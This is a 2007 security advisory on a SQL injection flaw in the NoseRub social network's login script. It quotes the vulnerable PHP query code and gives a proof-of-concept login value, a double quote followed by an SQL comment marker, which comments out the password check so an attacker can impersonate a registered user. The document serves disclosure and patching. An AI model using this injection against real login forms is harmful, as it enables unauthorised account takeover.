            Advisory: NoseRub Login SQL Injection Vulnerability
   Affected Versions: <= 0.5.2
      Fixed Versions: current SVN
                Risk: critical

          Vendor URL: http://noserub.com
       Vendor Status: informed, fixed version will be released soon
        Advisory URL: http://seclog.de/pub/seclog-2007-001.txt
     Advisory Status: public
              Author: Felix Groebert <felix AT groebert DOT org>
            Revision: 2007-12-26



Introduction
============
  NoseRub is a protocol for and a sample implementation of a decentralized
  social network.


Vulnerability
=============
  The login script fails to validate user input. It is possible to insert
  double quotes in order to escape the following SQL query:

  SELECT `Identity`.`id`, `Identity`.`is_local`, [...]
  FROM `identities` AS `Identity` WHERE `Identity`.`hash` = ''
  AND `Identity`.`username` = "www.example.com/noserub/USERNAME"
  AND `Identity`.`password` = 'f970e2767d0cfe75876ea857f92e319b' LIMIT 1

  The query is generated at the end of the function check() in
  app/models/identity.php:

  return $this->find(array('Identity.hash' => '',
              'Identity.username = "'. $username .'"',
              'Identity.password' => md5($data['Identity']['password'])));


Proof of Concept
================
  The SQL injection bug can be exploited by impersonating a registered user.

     Go to: http://www.example.com/noserub/pages/login/
  Login as: somereallogin " -- "
  Password: unknownpassword

  This results in the following SQL query, commenting out the fourth and fifth
  lines using double dashes, thus maintaining valid SQL syntax.

  SELECT `Identity`.`id`, `Identity`.`is_local`, [...]
  FROM `identities` AS `Identity` WHERE `Identity`.`hash` = ''
  AND `Identity`.`username` = "www.example.com/noserub/somereallogin"
  -- "" AND `Identity`.`password` = 'f970e2767d0cfe75876ea857f92e319b'
  LIMIT 1


Recommendation
==============
  It is recommended to upgrade to NoseRub > 0.5.2.
  A preliminary patched version of the affected file can be downloaded from
  SVN revision 515:
  http://noserub.googlecode.com/svn/trunk/app/models/identity.php
